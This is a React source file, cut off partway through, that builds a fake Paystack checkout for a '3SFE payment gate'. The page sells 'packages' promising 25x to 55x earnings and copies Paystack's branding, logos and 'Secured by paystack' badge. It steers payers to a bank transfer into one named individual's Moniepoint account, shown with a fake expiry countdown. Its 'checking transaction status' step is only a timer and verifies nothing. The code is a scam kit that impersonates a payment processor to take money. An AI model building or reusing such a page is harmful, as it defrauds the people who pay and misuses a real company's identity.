import React, { useState, useEffect } from 'react';
import { Check, ChevronDown, Copy, X } from 'lucide-react';

type ViewMode = 'form' | 'checkout';
type CheckoutMethod = null | 'transfer';
type TransferStep = 'loading' | 'details' | 'checking' | 'waiting';

interface PackageOption {
  id: string;
  name: string;
  multiplier: string;
  amount: number;
  label: string;
}

const PACKAGES: PackageOption[] = [
  {
    id: 'starter',
    name: 'Starter',
    multiplier: '1x earning',
    amount: 10000,
    label: 'Starter (1x earning) - NGN 10,000',
  },
  {
    id: 'bronze',
    name: 'Bronze',
    multiplier: '25x earnings',
    amount: 25000,
    label: 'Bronze (25x earnings) - NGN 25,000',
  },
  {
    id: 'silver',
    name: 'Silver',
    multiplier: '35x earnings',
    amount: 35000,
    label: 'Silver (35x earnings) - NGN 35,000',
  },
  {
    id: 'gold',
    name: 'Gold',
    multiplier: '55x earnings',
    amount: 55000,
    label: 'Gold (55x earnings) - NGN 55,000',
  },
];

function PaystackSpinner({ size = 34, dark = false }: { size?: number; dark?: boolean }) {
  const spokes = Array.from({ length: 12 });
  return (
    <div
      className="relative inline-block"
      style={{ width: size, height: size }}
      role="status"
      aria-label="Loading"
    >
      <svg viewBox="0 0 100 100" className="w-full h-full">
        {spokes.map((_, i) => {
          const rotation = i * 30;
          const delay = -(1 - i / 12).toFixed(3);
          return (
            <rect
              key={i}
              x="46.5"
              y="8"
              width="7"
              height="24"
              rx="3.5"
              fill={dark ? '#ffffff' : '#6b7280'}
              className="paystack-spoke"
              style={{
                transformOrigin: '50px 50px',
                transform: `rotate(${rotation}deg)`,
                animationDelay: `${delay}s`,
              }}
            />
          );
        })}
      </svg>
    </div>
  );
}

function PaystackLogoMark() {
  return (
    <svg width="24" height="22" viewBox="0 0 24 22" fill="none" aria-hidden="true">
      <rect x="0" y="0" width="24" height="3.6" rx="1.8" fill="#00C3F7" />
      <rect x="0" y="6" width="24" height="3.6" rx="1.8" fill="#00C3F7" />
      <rect x="0" y="12" width="15" height="3.6" rx="1.8" fill="#00C3F7" />
      <rect x="0" y="18" width="24" height="3.6" rx="1.8" fill="#00C3F7" />
    </svg>
  );
}

function SecuredByPaystack() {
  return (
    <div className="flex items-center justify-center gap-1.5 select-none">
      <svg width="12" height="14" viewBox="0 0 12 14" fill="none" className="text-[#4a5568]">
        <path
          d="M9.5 5.5V4C9.5 2.067 7.933 0.5 6 0.5C4.067 0.5 2.5 2.067 2.5 4V5.5H1.5C0.947715 5.5 0.5 5.94772 0.5 6.5V12.5C0.5 13.0523 0.947715 13.5 1.5 13.5H10.5C11.0523 13.5 11.5 13.0523 11.5 12.5V6.5C11.5 5.94772 11.0523 5.5 10.5 5.5H9.5ZM4 4C4 2.89543 4.89543 2 6 2C7.10457 2 8 2.89543 8 4V5.5H4V4Z"
          fill="#4A5568"
        />
      </svg>
      <span className="text-[12.5px] text-[#4a5568] font-normal tracking-[-0.01em]">
        Secured by <strong className="font-extrabold text-[#0f172a] tracking-tight text-[13.5px]">paystack</strong>
      </span>
    </div>
  );
}

function PaymentBadgesBar() {
  return (
    <div className="bg-white rounded-[6px] shadow-[0_4px_18px_rgba(0,0,0,0.06)] border border-[#f0f2f5] px-3 py-3 flex items-center justify-between gap-1.5 mt-1.5">
      {/* VISA */}
      <div className="flex items-center justify-center px-1">
        <svg width="36" height="12" viewBox="0 0 48 16" fill="none">
          <path
            d="M18.3 0.4L13.3 15.6H8.9L13.9 0.4H18.3ZM36.2 10.2L38.5 3.8L39.8 10.2H36.2ZM41.2 15.6H45.2L41.7 0.4H38C37.1 0.4 36.3 0.9 36 1.7L29.7 15.6H34.2L35.1 13.1H40.6L41.2 15.6ZM30.1 10.6C30.1 6.6 24.5 6.4 24.5 4.6C24.5 4 25.1 3.4 26.3 3.2C27 3.1 28.6 3 30.5 3.9L31.3 0.8C30.2 0.4 28.7 0 26.9 0C22.7 0 19.7 2.2 19.7 5.4C19.7 7.8 21.8 9.1 23.4 9.9C25.1 10.7 25.6 11.2 25.6 12C25.6 13.1 24.3 13.6 23 13.6C20.9 13.6 19.7 13 18.7 12.5L17.9 15.7C18.9 16.2 20.8 16.6 22.7 16.6C27.2 16.6 30.1 14.4 30.1 10.6ZM11.7 0.4L4.9 15.6H0.4L4.2 2.5C4.4 1.6 4.7 1.3 5.4 0.9C6.6 0.3 8.6 0.1 10.3 0.4H11.7Z"
            fill="#1A1F71"
          />
          <path d="M5.4 0.9C4.7 1.3 4.4 1.6 4.2 2.5L0.4 15.6H4.9L11.7 0.4H5.4V0.9Z" fill="#1A1F71" />
          <path d="M0.2 0.4L0 1.2C3.3 2 5.9 4.1 6.9 6.8L5.9 1.6C5.7 0.8 5 0.4 4.2 0.4H0.2Z" fill="#F79E1B" />
        </svg>
      </div>

      {/* Mastercard */}
      <div className="flex flex-col items-center justify-center px-0.5">
        <svg width="26" height="16" viewBox="0 0 28 18" fill="none">
          <circle cx="10" cy="9" r="8" fill="#EB001B" />
          <circle cx="18" cy="9" r="8" fill="#F79E1B" fillOpacity="0.9" />
          <path
            d="M14 2.75C15.8 4.2 17 6.46 17 9C17 11.54 15.8 13.8 14 15.25C12.2 13.8 11 11.54 11 9C11 6.46 12.2 4.2 14 2.75Z"
            fill="#FF5F00"
          />
        </svg>
        <span className="text-[5.5px] font-bold text-[#222] tracking-tighter -mt-0.5">mastercard</span>
      </div>

      {/* Verve */}
      <div className="flex items-center gap-0.5 px-0.5">
        <div className="w-4 h-4 rounded-full bg-[#e31837] flex items-center justify-center">
          <span className="text-white font-serif italic font-bold text-[10px] leading-none">V</span>
        </div>
        <span className="text-[11px] font-bold text-[#003366] tracking-tight -ml-0.5">erve</span>
      </div>

      {/* American Express */}
      <div className="bg-[#006fcf] rounded-[2px] px-1 py-0.5 flex flex-col items-center justify-center leading-none">
        <span className="text-[4.5px] font-extrabold text-white tracking-tighter">AMERICAN</span>
        <span className="text-[4.5px] font-extrabold text-white tracking-tighter mt-[1px]">EXPRESS</span>
      </div>

      {/* Apple Pay */}
      <div className="border border-[#d1d5db] rounded-[4px] px-1.5 py-0.5 flex items-center gap-0.5 h-[20px]">
        <svg width="9" height="11" viewBox="0 0 14 17" fill="#000">
          <path d="M11.6 9.1C11.6 6.9 13.4 5.8 13.5 5.7C12.4 4.2 10.8 4 10.2 3.9C8.8 3.8 7.5 4.7 6.8 4.7C6.1 4.7 5 3.9 3.8 3.9C2.3 3.9 0.9 4.8 0.1 6.1C-1.5 8.8 -0.3 12.9 1.2 15.1C2 16.2 2.9 17.4 4.1 17.3C5.3 17.2 5.8 16.5 7.2 16.5C8.5 16.5 9 17.3 10.2 17.3C11.5 17.3 12.2 16.2 13 15.1C13.9 13.8 14.3 12.5 14.3 12.4C14.2 12.4 11.6 11.4 11.6 9.1ZM9.3 2.5C10 1.7 10.4 0.6 10.3 -0.5C9.3 -0.5 8.1 0.2 7.4 1C6.8 1.7 6.3 2.8 6.4 3.9C7.5 4 8.6 3.3 9.3 2.5Z" />
        </svg>
        <span className="text-[9.5px] font-semibold text-black tracking-tight">Pay</span>
      </div>

      {/* G Pay */}
      <div className="border border-[#d1d5db] rounded-[4px] px-1.5 py-0.5 flex items-center gap-0.5 h-[20px]">
        <svg width="9" height="9" viewBox="0 0 24 24">
          <path
            fill="#4285F4"
            d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"
          />
          <path
            fill="#34A853"
            d="M12 24c3.3 0 6.08-1.09 8.11-2.96l-3.88-3.05c-1.1.74-2.51 1.18-4.23 1.18-3.25 0-6.01-2.19-7-5.14H1.01v3.14C3.03 21.2 7.21 24 12 24z"
          />
          <path
            fill="#FBBC05"
            d="M5 14.03c-.25-.74-.39-1.54-.39-2.36 0-.82.14-1.62.39-2.36V6.17H1.01C.37 7.45 0 8.89 0 10.42s.37 2.97 1.01 4.25L5 14.03z"
          />
          <path
            fill="#EA4335"
            d="M12 4.75c1.8 0 3.41.62 4.68 1.84l3.51-3.51C18.07 1.19 15.3 0 12 0 7.21 0 3.03 2.8 1.01 6.83L5 9.97c.99-2.95 3.75-5.22 7-5.22z"
          />
        </svg>
        <span className="text-[9.5px] font-semibold text-[#3c4043] tracking-tight">Pay</span>
      </div>

      {/* AFRIGO */}
      <div className="flex items-center pl-0.5">
        <span className="text-[9px] font-extrabold text-[#0b6b3a] tracking-tighter">AFRI</span>
        <span className="text-[9px] font-extrabold text-[#e67e22] tracking-tighter">GO</span>
        <span className="w-3.5 h-3.5 rounded-full bg-[#68c783]/70 -ml-1.5 inline-block" />
      </div>
    </div>
  );
}

export default function App() {
  const [view, setView] = useState<ViewMode>('form');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [email, setEmail] = useState('');
  const [selectedPackageId, setSelectedPackageId] = useState<string>('starter');
  const [isPackageDropdownOpen, setIsPackageDropdownOpen] = useState(false);

  // Form submission transition states
  const [isPleaseWait, setIsPleaseWait] = useState(false);
  const [showDarkOverlaySpinner, setShowDarkOverlaySpinner] = useState(false);

  // Checkout states
  const [checkoutMethod, setCheckoutMethod] = useState<CheckoutMethod>(null);
  const [transferStep, setTransferStep] = useState<TransferStep>('loading');
  const [secondsLeft, setSecondsLeft] = useState(29 * 60 + 59); // 29:59
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [showHelpNote, setShowHelpNote] = useState(false);

  const selectedPackage =
    PACKAGES.find((pkg) => pkg.id === selectedPackageId) || PACKAGES[0];
  const numericAmount = selectedPackage.amount;
  const formattedAmount = numericAmount.toLocaleString('en-US');

  // Countdown timer for Transfer screen (29:59 -> 29:58 -> ...)
  useEffect(() => {
    if (view === 'checkout' && checkoutMethod === 'transfer' && transferStep === 'details') {
      const interval = setInterval(() => {
        setSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [view, checkoutMethod, transferStep]);

  // Automatic transition when selecting 'transfer' -> 'loading' -> 'details'
  useEffect(() => {
    if (checkoutMethod === 'transfer' && transferStep === 'loading') {
      const timer = setTimeout(() => {
        setTransferStep('details');
      }, 650);
      return () => clearTimeout(timer);
    }
  }, [checkoutMethod, transferStep]);

  // Automatic transition when clicking "I've sent the money" -> 'checking' -> 'waiting'
  useEffect(() => {
    if (checkoutMethod === 'transfer' && transferStep === 'checking') {
      const timer = setTimeout(() => {
        setTransferStep('waiting');
      }, 3400);
      return () => clearTimeout(timer);
    }
  }, [checkoutMethod, transferStep]);

  const formatTimer = (totalSecs: number) => {
    const mins = Math.floor(totalSecs / 60);
    const secs = totalSecs % 60;
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  const handlePayNow = (e: React.FormEvent) => {
    e.preventDefault();

    if (!firstName.trim()) setFirstName('Qq');
    if (!lastName.trim()) setLastName('Qqq');
    if (!email.trim()) setEmail('abdullahi@gmail.com');

    // Step 1: Button shows "Please wait..."
    setIsPleaseWait(true);

    // Step 2: Dark overlay with spinner appears
    setTimeout(() => {
      setShowDarkOverlaySpinner(true);
    }, 450);

    // Step 3: Transition to Paystack Checkout screen
    setTimeout(() => {
      setIsPleaseWait(false);
      setShowDarkOverlaySpinner(false);
      setCheckoutMethod(null);
      setView('checkout');
    }, 1250);
  };

  const handleSelectTransfer = () => {
    setCheckoutMethod('transfer');
    setShowHelpNote(false);
    setSecondsLeft(29 * 60 + 59);
    setTransferStep('loading');
  };

  const handleCopy = (text: string, label: string) => {
    navigator.clipboard?.writeText(text).catch(() => {});
    setCopiedField(label);
    setTimeout(() => {
      setCopiedField(null);
    }, 1500);
  };

  const handleCancelPayment = () => {
    setCheckoutMethod(null);
    setView('form');
  };

  const handleChangePaymentMethod = () => {
    setCheckoutMethod(null);
    setShowHelpNote(false);
  };

  const activeEmail = email.trim() || 'abdullahi@gmail.com';

  // Render initial 3SFE payment gate form
  if (view === 'form') {
    return (
      <div className="min-h-screen bg-white relative flex flex-col">
        {/* Top Light Blue Header Banner */}
        <header className="w-full bg-[#ebf7fc] pt-5 pb-7 px-4 text-center select-none">
          <h1 className="text-[18px] font-bold text-[#222222] tracking-[-0.01em]">
            3SFE payment gate
          </h1>
          <p className="text-[12px] text-[#5c6672] uppercase tracking-[0.06em] mt-2.5 font-normal">
            BY G GY
          </p>
        </header>

        {/* Main Form Container */}
        <main className="w-full max-w-[440px] mx-auto px-6 pt-9 pb-14 flex-1 relative">
          {/* Subtle blue scrollbar indicator matching right edge in video */}
          <div
            className="w-[3px] h-44 bg-[#2596ff] rounded-full absolute right-[2px] top-12 opacity-90 pointer-events-none"
            aria-hidden="true"
          />

          <form onSubmit={handlePayNow} className="space-y-4">
            {/* First name */}
            <div>
              <label
                htmlFor="firstName"
                className="block text-[15px] font-medium text-[#111111] mb-2"
              >
                First name
              </label>
              <input
                id="firstName"
                type="text"
                placeholder="First name"
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
                className={`w-full rounded-[4px] px-3.5 py-2.5 text-[15.5px] text-[#222] placeholder-[#9ca3af] outline-none transition-colors border ${
                  firstName
                    ? 'bg-[#f3f9f9] border-[#7fa8a8] focus:bg-white focus:border-[#2596ff]'
                    : 'bg-white border-[#d1d5db] focus:border-[#2596ff]'
                }`}
              />
            </div>

            {/* Last name */}
            <div>
              <label
                htmlFor="lastName"
                className="block text-[15px] font-medium text-[#111111] mb-2"
              >
                Last name
              </label>
              <input
                id="lastName"
                type="text"
                placeholder="Last name"
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
                className={`w-full rounded-[4px] px-3.5 py-2.5 text-[15.5px] text-[#222] placeholder-[#9ca3af] outline-none transition-colors border ${
                  lastName
                    ? 'bg-[#f3f9f9] border-[#7fa8a8] focus:bg-white focus:border-[#2596ff]'
                    : 'bg-white border-[#d1d5db] focus:border-[#2596ff]'
                }`}
              />
            </div>

            {/* Email address */}
            <div>
              <label
                htmlFor="email"
                className="block text-[15px] font-medium text-[#111111] mb-2"
              >
                Email address
              </label>
              <input
                id="email"
                type="email"
                placeholder="Email address"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`w-full rounded-[4px] px-3.5 py-2.5 text-[15.5px] text-[#222] placeholder-[#9ca3af] outline-none transition-colors border ${
                  email
                    ? 'bg-[#f3f9f9] border-[#7fa8a8] focus:bg-white focus:border-[#2596ff]'
                    : 'bg-white border-[#d1d5db] focus:border-[#2596ff]'
                }`}
              />
            </div>

            {/* Choose a package */}
            <div className="relative">
              <label
                htmlFor="packageSelect"
                className="block text-[15px] font-medium text-[#111111] mb-2"
              >
                Choose a package
              </label>

              <button
                id="packageSelect"
                type="button"
                onClick={() => setIsPackageDropdownOpen((prev) => !prev)}
                className="w-full rounded-[4px] border border-[#d1d5db] focus:border-[#2596ff] bg-white px-3.5 py-2.5 text-left flex items-center justify-between transition-colors cursor-pointer"
              >
                <div className="flex items-center gap-2 min-w-0">
                  <span className="text-[14.5px] font-medium text-[#222222] truncate">
                    {selectedPackage.name} ({selectedPackage.multiplier})
                  </span>
                  <span className="text-[13.5px] text-[#3bb75e] font-semibold tabular-nums shrink-0">
                    — NGN {selectedPackage.amount.toLocaleString('en-US')}
                  </span>
                </div>
                <ChevronDown
                  className={`w-4 h-4 text-[#6b7280] shrink-0 transition-transform ${
                    isPackageDropdownOpen ? 'rotate-180' : ''
                  }`}
                />
              </button>

              {isPackageDropdownOpen && (
                <div className="absolute left-0 right-0 top-full mt-1 bg-white border border-[#d1d5db] rounded-[4px] shadow-[0_6px_20px_rgba(0,0,0,0.08)] z-30 overflow-hidden">
                  {PACKAGES.map((pkg) => {
                    const isSelected = pkg.id === selectedPackageId;
                    return (
                      <button
                        key={pkg.id}
                        type="button"
                        onClick={() => {
                          setSelectedPackageId(pkg.id);
                          setIsPackageDropdownOpen(false);
                        }}
                        className={`w-full px-3.5 py-2.5 text-left flex items-center justify-between border-b border-[#f1f3f5] last:border-b-0 transition-colors cursor-pointer ${
                          isSelected
                            ? 'bg-[#ebf7fc]/70 font-semibold text-[#111111]'
                            : 'bg-white hover:bg-[#f9fafb] text-[#222222]'
                        }`}
                      >
                        <div>
                          <span className="text-[14.5px] font-medium text-[#111111]">
                            {pkg.name}
                          </span>
                          <span className="text-[13px] text-[#5c6672] ml-1.5">
                            ({pkg.multiplier})
                          </span>
                        </div>
                        <span className="text-[14px] font-semibold text-[#3bb75e] tabular-nums">
                          NGN {pkg.amount.toLocaleString('en-US')}
                        </span>
                      </button>
                    );
                  })}
                </div>
              )}
            </div>

            {/* Secured by paystack + Payment Logos Card */}
            <div className="pt-5">
              <SecuredByPaystack />
              <PaymentBadgesBar />
            </div>

            {/* Pay now Button */}
            <div className="pt-6">
              <button
                type="submit"
                disabled={isPleaseWait}
                className={`w-full py-3.5 rounded-[5px] text-white font-medium text-[16px] transition-colors cursor-pointer ${
                  isPleaseWait
                    ? 'bg-[#6bc985]'
                    : 'bg-[#3bb75e] hover:bg-[#34a453] active:bg-[#2d9148]'
                }`}
              >
                {isPleaseWait ? 'Please wait...' : 'Pay now'}
              </button>
            </div>
          </form>
        </main>

        {/* Full-screen dark translucent spinner overlay */}
        {showDarkOverlaySpinner && (
          <div className="fixed inset-0 bg-black/65 z-50 flex items-center justify-center">
            <PaystackSpinner size={38} dark={true} />
          </div>
        )}
      </div>
    );
  }

  // Render Paystack Checkout screen
  return (
    <div className="min-h-screen bg-white flex flex-col items-center">
      <div className="w-full max-w-[440px] min-h-screen bg-white flex flex-col">
        {/* CASE 1: Payment Method Selection Menu */}
        {checkoutMethod === null && (
          <div className="flex-1 flex flex-col">
            {/* Checkout Header */}
            <div className="px-5 pt-4 pb-5">
              <p className="text-[11.5px] font-bold text-[#3bb75e] uppercase tracking-[0.04em]">
                PAYSTACK CHECKOUT
              </p>
              <h2 className="text-[15.5px] text-[#222222] font-normal mt-1 leading-[1.38]">
                Use one of the payment methods below to pay NGN {formattedAmount} to G gy
              </h2>
            </div>

            {/* Payment Method List Rows (Only Pay with Transfer is bold/active, others shadowed grey) */}
            <div className="border-t border-[#efefef]">
              {/* 1. Pay with Zap (Shadowed Grey) */}
              <div
                aria-disabled="true"
                className="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 text-left select-none opacity-45 cursor-not-allowed"
              >
                <span className="bg-[#9ca3af] text-white text-[9px] font-medium px-1.5 py-[2px] rounded-[3px] uppercase tracking-wider mr-2.5 leading-none">
                  NEW
                </span>
                <span className="text-[15px] font-normal text-[#9ca3af]">
                  Pay with Zap
                </span>
              </div>

              {/* 2. Pay with Vault (Shadowed Grey) */}
              <div
                aria-disabled="true"
                className="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 text-left select-none opacity-45 cursor-not-allowed"
              >
                <span className="w-5 flex items-center justify-center mr-3">
                  <svg width="15" height="15" viewBox="0 0 16 16" fill="none">
                    <rect x="1" y="1" width="14" height="14" rx="2.5" fill="#9ca3af" />
                    <circle cx="8" cy="8" r="2.2" fill="#ffffff" />
                    <path d="M8 8L11 8" stroke="#ffffff" strokeWidth="1.3" strokeLinecap="round" />
                  </svg>
                </span>
                <span className="text-[15px] font-normal text-[#9ca3af]">
                  Pay with Vault
                </span>
              </div>

              {/* 3. Pay with Card (Shadowed Grey) */}
              <div
                aria-disabled="true"
                className="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 text-left select-none opacity-45 cursor-not-allowed"
              >
                <span className="w-5 flex items-center justify-center mr-3">
                  <svg width="16" height="12" viewBox="0 0 16 12" fill="none">
                    <rect x="0.75" y="0.75" width="14.5" height="10.5" rx="1.5" stroke="#9ca3af" strokeWidth="1.3" />
                    <rect x="1" y="3" width="14" height="2.2" fill="#9ca3af" />
                    <rect x="2.5" y="7.5" width="4" height="1.4" rx="0.5" fill="#9ca3af" />
                  </svg>
                </span>
                <span className="text-[15px] font-normal text-[#9ca3af]">
                  Pay with Card
                </span>
              </div>

              {/* 4. Pay with Transfer (ACTIVE & BOLD) */}
              <button
                type="button"
                onClick={handleSelectTransfer}
                className="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-white hover:bg-[#f9fafb] active:bg-[#f2f2f2] transition-colors text-left cursor-pointer"
              >
                <span className="w-5 flex items-center justify-center mr-3 text-[#222222]">
                  <svg width="16" height="14" viewBox="0 0 16 14" fill="none">
                    <rect x="0.75" y="2.75" width="14.5" height="10.5" rx="1.5" stroke="#222222" strokeWidth="1.4" />
                    <path d="M5 1H11" stroke="#222222" strokeWidth="1.4" strokeLinecap="round" />
                    <path d="M5.5 8H10.5M10.5 8L8.5 6M10.5 8L8.5 10" stroke="#222222" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                </span>
                <span className="text-[15px] font-bold text-[#111111]">
                  Pay with Transfer
                </span>
              </button>

              {/* 5. Pay with Bank (Shadowed Grey) */}
              <div
                aria-disabled="true"
                className="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 text-left select-none opacity-45 cursor-not-allowed"
              >
                <span className="w-5 flex items-center justify-center mr-3">
                  <svg width="15" height="15" viewBox="0 0 16 16" fill="none">
                    <path d="M8 1.2L1.2 5H14.8L8 1.2Z" stroke="#9ca3af" strokeWidth="1.2" strokeLinejoin="round" />
                    <path d="M3.2 5.2V11.8M8 5.2V11.8M12.8 5.2V11.8" stroke="#9ca3af" strokeWidth="1.3" strokeLinecap="round" />
                    <path d="M1.2 12.2H14.8M0.8 14.5H15.2" stroke="#9ca3af" strokeWidth="1.3" strokeLinecap="round" />
                  </svg>
                </span>
                <span className="text-[15px] font-normal text-[#9ca3af]">
                  Pay with Bank
                </span>
              </div>

              {/* 6. Pay with USSD (Shadowed Grey) */}
              <div
                aria-disabled="true"
                className="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 text-left select-none opacity-45 cursor-not-allowed"
              >
                <span className="w-5 flex items-center justify-center mr-3 text-[#9ca3af] font-mono font-normal text-[12px] tracking-tighter">
                  *#
                </span>
                <span className="text-[15px] font-normal text-[#9ca3af]">
                  Pay with USSD
                </span>
              </div>

              {/* 7. Pay with OPay (Shadowed Grey) */}
              <div
                aria-disabled="true"
                className="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 text-left select-none opacity-45 cursor-not-allowed"
              >
                <span className="w-5 flex items-center justify-center mr-3">
                  <svg width="15" height="15" viewBox="0 0 16 16" fill="none">
                    <circle cx="8" cy="8" r="5.5" stroke="#9ca3af" strokeWidth="2" />
                    <rect x="0.5" y="6.2" width="4" height="3.6" fill="#fafafa" />
                    <path d="M1.5 8H4.5" stroke="#9ca3af" strokeWidth="1.8" strokeLinecap="round" />
                  </svg>
                </span>
                <span className="text-[15px] font-normal text-[#9ca3af]">
                  Pay with OPay
                </span>
              </div>
            </div>

            {/* Bottom Cancel & Secured By Paystack */}
            <div className="mt-14 pb-10 flex flex-col items-center">
              <button
                type="button"
                onClick={handleCancelPayment}
                className="border border-[#dcdfe6] rounded-[4px] px-4 py-2 text-[13px] text-[#4a5568] bg-white hover:bg-gray-50 active:bg-gray-100 flex items-center gap-1.5 shadow-[0_1px_2px_rgba(0,0,0,0.03)] cursor-pointer"
              >
                <X className="w-3.5 h-3.5 text-[#718096]" />
                <span>Cancel Payment</span>
              </button>

              <div className="mt-6">
                <SecuredByPaystack />
              </div>
            </div>
          </div>
        )}

        {/* CASE 2: Pay with Transfer View */}
        {checkoutMethod === 'transfer' && (
          <div className="flex-1 flex flex-col">
            {/* Top Method Indicator Bar */}
            <div className="bg-[#f4f5f7] px-5 py-3 flex items-center gap-2.5 border-b border-[#ebebeb]">
              <svg width="16" height="14" viewBox="0 0 16 14" fill="none">
                <rect x="0.75" y="2.75" width="14.5" height="10.5" rx="1.5" stroke="#3bb75e" strokeWidth="1.4" />
                <path d="M5 1H11" stroke="#3bb75e" strokeWidth="1.4" strokeLinecap="round" />
                <path d="M5.5 8H10.5M10.5 8L8.5 6M10.5 8L8.5 10" stroke="#3bb75e" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              <span className="text-[13.5px] font-medium text-[#222222]">Pay with Transfer</span>
            </div>

            {/* Paystack Subheader with 4-Bar Cyan Mark & User Email / Amount */}
            <div className="px-5 py-3.5 flex items-center justify-between border-b border-[#efefef] bg-white">
              <PaystackLogoMark />
              <div className="text-right">
                <p className="text-[12.5px] text-[#666666] leading-snug">{activeEmail}</p>
                <p className="text-[13.5px] text-[#444444] leading-snug mt-0.5">
                  Pay <span className="font-bold text-[#3bb75e]">NGN {formattedAmount}</span>
                </p>
              </div>
            </div>

            {/* TRANSFER BODY CONTENT */}
            <div className="bg-white">
              {/* Step 1: Loading Spinner */}
              {transferStep === 'loading' && (
                <div className="py-24 flex items-center justify-center">
                  <PaystackSpinner size={34} />
                </div>
              )}

              {/* Step 2: Account Details & Countdown */}
              {transferStep === 'details' && (
                <div className="pt-5 pb-6">
                  <h3 className="text-center text-[15.5px] font-semibold text-[#222222] px-8 leading-snug mb-4">
                    Transfer NGN {formattedAmount} to Abdullahi Umar
                  </h3>

                  {/* Gray Details Card with Abdullahi Umar / 6725375556 / Moniepoint MFB */}
                  <div className="mx-5 bg-[#f8f9fa] rounded-[5px] px-4 py-3.5 border border-[#f0f1f3] space-y-3.5">
                    <div>
                      <p className="text-[10px] text-[#777777] uppercase tracking-wider font-medium">
                        ACCOUNT NAME
                      </p>
                      <p className="text-[14.5px] text-[#222222] font-medium mt-0.5">
                        Abdullahi Umar
                      </p>
                    </div>

                    <div>
                      <p className="text-[10px] text-[#777777] uppercase tracking-wider font-medium">
                        BANK NAME
                      </p>
                      <p className="text-[14.5px] text-[#222222] font-medium mt-0.5">
                        Moniepoint MFB
                      </p>
                    </div>

                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-[10px] text-[#777777] uppercase tracking-wider font-medium">
                          ACCOUNT NUMBER
                        </p>
                        <p className="text-[16px] text-[#222222] font-medium mt-0.5 tabular-nums tracking-tight">
                          6725375556
                        </p>
                      </div>
                      <button
                        type="button"
                        onClick={() => handleCopy('6725375556', 'account')}
                        className="p-1.5 text-[#9ca3af] hover:text-[#333333] transition-colors cursor-pointer flex items-center gap-1"
                        title="Copy account number"
                      >
                        {copiedField === 'account' ? (
                          <span className="text-[11px] text-[#3bb75e] font-medium">Copied</span>
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                      </button>
                    </div>

                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-[10px] text-[#777777] uppercase tracking-wider font-medium">
                          AMOUNT
                        </p>
                        <p className="text-[14.5px] text-[#222222] font-medium mt-0.5 tabular-nums">
                          NGN {formattedAmount}
                        </p>
                      </div>
                      <button
                        type="button"
                        onClick={() => handleCopy(String(numericAmount), 'amount')}
                        className="p-1.5 text-[#9ca3af] hover:text-[#333333] transition-colors cursor-pointer flex items-center gap-1"
                        title="Copy amount"
                      >
                        {copiedField === 'amount' ? (
                          <span className="text-[11px] text-[#3bb75e] font-medium">Copied</span>
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                      </button>
                    </div>
                  </div>

                  {/* Dashed Separator Line */}
                  <div className="mx-5 my-5 border-t border-dashed border-[#dcdcdc]" />

                  {/* Expiry Notice */}
                  <p className="px-7 text-center text-[12.5px] text-[#555555] leading-relaxed">
                    Search for Moniepoint MFB in your bank app. This account is for this
                    transaction only and expires in{' '}
                    <span className="text-[#3bb75e] font-semibold tabular-nums">
                      {formatTimer(secondsLeft)}
                    </span>
                  </p>

                  {/* I've sent the money button */}
                  <div className="px-5 mt-5">
                    <button
                      type="button"
                      onClick={() => setTransferStep('checking')}
                      className="w-full py-3 border border-[#dcdcdc] rounded-[4px] bg-white text-[#222222] text-[13.5px] font-medium hover:bg-gray-50 active:bg-gray-100 transition-colors shadow-[0_1px_2px_rgba(0,0,0,0.02)] cursor-pointer"
                    >
                      I&apos;ve sent the money
                    </button>
                  </div>
                </div>
              )}

              {/* Step 3: Checking transaction status */}
              {transferStep === 'checking' && (
                <div className="py-20 flex flex-col items-center justify-center">
                  <PaystackSpinner size={34} />
                  <p className="text-[13.5px] text-[#333333] mt-3.5">
                    Checking transaction status
                  </p>
                </div>
              )}

              {/* Step 4: Waiting to confirm transfer */}
              {transferStep === 'waiting' && (
                <div className="pt-7 pb-6 px-5">
                  <h3 className="text-center text-[14.5px] font-medium text-[#222222] leading-relaxed">
                    We&apos;re waiting to confirm your transfer.
                    <br />
                    This can take a few minutes
                  </h3>

                  {/* Sent -> Received Progress Indicator with Continuously Moving Green Line */}
                  <div className="mt-7 mb-7 px-4 flex items-start justify-between">
                    {/* Sent Node */}
                    <div className="flex flex-col items-center">
                      <div className="w-7 h-7 rounded-full bg-[#3bb75e] text-white flex items-center justify-center">
                        <Check className="w-4 h-4 stroke-[2.5]" />
                      </div>
                      <span className="text-[11.5px] text-[#555555] mt-2">Sent</span>
                    </div>

                    {/* Connecting Progress Track with Moving Green Bar */}
                    <div className="flex-1 mx-2.5 mt-2.5 h-2.5 rounded-full bg-[#f0f0f0] overflow-hidden relative p-[1.5px]">
                      <div className="w-2/5 h-full rounded-full bg-[#3bb75e]/60 animate-progress-move" />
                    </div>

                    {/* Received Node */}
                    <div className="flex flex-col items-center">
                      <div className="w-7 h-7 rounded-full border-[1.5px] border-dashed border-[#cccccc]" />
                      <span className="text-[11.5px] text-[#555555] mt-2">Received</span>
                    </div>
                  </div>

                  {/* Get help button */}
                  <button
                    type="button"
                    onClick={() => setShowHelpNote((prev) => !prev)}
